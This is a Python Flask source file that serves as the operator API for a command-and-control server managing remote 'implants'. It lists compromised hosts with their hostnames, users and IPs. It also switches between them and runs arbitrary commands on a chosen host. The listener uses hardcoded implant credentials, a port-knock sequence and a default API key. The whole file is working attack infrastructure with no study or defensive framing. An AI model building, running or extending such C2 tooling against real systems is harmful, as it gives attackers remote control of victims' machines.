# c2_api_server.py
from flask import Flask, request, jsonify
import threading
import requests
import logging
import os
import json
from functools import wraps

# Import modified C2Server class
from server.c2_server import C2Server

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger('C2APIServer')

# Initialize Flask app
app = Flask(__name__)

# Configuration
API_KEY = os.getenv('C2_API_KEY', 'your-secret-api-key')
WEB_INTERFACE_URL = os.getenv('WEB_INTERFACE_URL', 'http://localhost:5000/api/webhook')

# Create and start C2 server
c2_server_config = {
    'bind_address': '0.0.0.0',
    'port': 2222,
    'host_key': 'fren',
    'username': 'implant',
    'password': 'implant',
    'knock_sequence': [10000, 10001, 10002]
}

# Create C2 server instance
c2_server = C2Server(c2_server_config)

# API key authentication decorator
def require_api_key(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        auth_header = request.headers.get('Authorization')
        if not auth_header or not auth_header.startswith('Bearer ') or auth_header[7:] != API_KEY:
            return jsonify({"error": "Unauthorized"}), 401
        return f(*args, **kwargs)
    return decorated_function

# Notify web interface about new implants
def notify_web_interface(event_type, data):
    try:
        endpoint = f"{WEB_INTERFACE_URL}/{event_type}"
        headers = {"Authorization": f"Bearer {API_KEY}"}
        response = requests.post(endpoint, json=data, headers=headers)
        
        if response.status_code != 200:
            logger.error(f"Failed to notify web interface: {response.text}")
    except Exception as e:
        logger.error(f"Error notifying web interface: {e}")

# Modified C2Server callback for new clients
def on_new_client(client):
    client_data = {
        'implant_id': client.channel.get_id(),
        'hostname': client.hostname,
        'username': client.username,
        'ip_address': client.addr[0],
        'port': client.addr[1],
        'platform': client.client_info.get('platform', 'unknown'),
        'architecture': client.client_info.get('architecture', 'unknown')
    }
    
    notify_web_interface('implant', client_data)
    logger.info(f"New implant registered: {client.hostname}")

# Set the callback in the C2Server instance
c2_server.on_new_client = on_new_client

# API Routes
@app.route('/api/implants', methods=['GET'])
@require_api_key
def get_implants():
    implants = []
    for i, (client_id, client) in enumerate(c2_server.clients.items()):
        if client.is_active:
            implants.append({
                'id': i,
                'implant_id': client_id,
                'hostname': client.hostname,
                'username': client.username,
                'ip_address': client.addr[0],
                'port': client.addr[1],
                'is_current': client_id == c2_server.current_client_id
            })
    
    return jsonify({"implants": implants})

@app.route('/api/implants/<implant_id>/select', methods=['POST'])
@require_api_key
def select_implant(implant_id):
    # Find client index by implant_id
    client_index = -1
    for i, (client_id, _) in enumerate(c2_server.clients.items()):
        if client_id == implant_id:
            client_index = i
            break
    
    if client_index == -1:
        return jsonify({"error": "Implant not found"}), 404
        
    if c2_server.switch_client(client_index):
        logger.info(f"Selected implant {implant_id}")
        return jsonify({"success": True})
        
    return jsonify({"error": "Failed to select implant"}), 500

@app.route('/api/implants/<implant_id>/command', methods=['POST'])
@require_api_key
def execute_command(implant_id):
    data = request.json
    command = data.get('command')
    command_id = data.get('command_id')
    operator_id = data.get('operator_id')
    
    if not command:
        return jsonify({"error": "No command provided"}), 400
    
    # Find client index by implant_id
    client_index = -1
    for i, (client_id, _) in enumerate(c2_server.clients.items()):
        if client_id == implant_id:
            client_index = i
            break
    
    if client_index == -1:
        return jsonify({"error": "Implant not found"}), 404
    
    # Switch to the client
    if not c2_server.switch_client(client_index):
        return jsonify({"error": "Failed to select implant"}), 500
    
    try:
        # Execute the command
        logger.info(f"Executing command on {implant_id}: {command}")
        response = c2_server.send_command(command)
        
        # Notify web interface about command completion
        if command_id:
            notify_web_interface('command', {
                'command_id': command_id,
                'response': response,
                'status': 'completed'
            })
        
        return jsonify({
            "success": True,
            "command": command,
            "response": response
        })
        
    except Exception as e:
        logger.error(f"Error executing command: {e}")
        
        # Notify web interface about command failure
        if command_id:
            notify_web_interface('command', {
                'command_id': command_id,
                'response': str(e),
                'status': 'failed'
            })
            
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    # Start the C2 server in a background thread
    server_thread = threading.Thread(target=c2_server.start)
    server_thread.daemon = True
    server_thread.start()
    
    logger.info("C2 server started in background")
    
    # Start the API server
    app.run(host='0.0.0.0', port=5001, debug=False)